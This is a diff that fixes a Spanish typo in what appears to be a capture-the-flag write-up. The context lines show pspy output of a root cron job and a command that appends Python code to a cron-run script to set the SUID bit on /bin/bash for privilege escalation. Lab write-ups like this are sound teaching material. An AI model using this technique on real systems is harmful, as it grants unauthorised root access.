@@ -329,7 +329,7 @@ Usamos la herramienta [**Pspy**](https://github.com/DominicBreuker/pspy) y vemos
 2025/02/12 04:26:01 CMD: UID=0     PID=20470  | CRON
 ```
 
-Añadimos nuestro códogo al archivo, para cambiar los permisos de la bash añadiendo el `bit SUID`.
+Añadimos nuestro código al archivo, para cambiar los permisos de la bash añadiendo el `bit SUID`.
 
 ```bash
 echo "import os; os.system('chmod u+s /bin/bash')" >> /var/www/connect.py
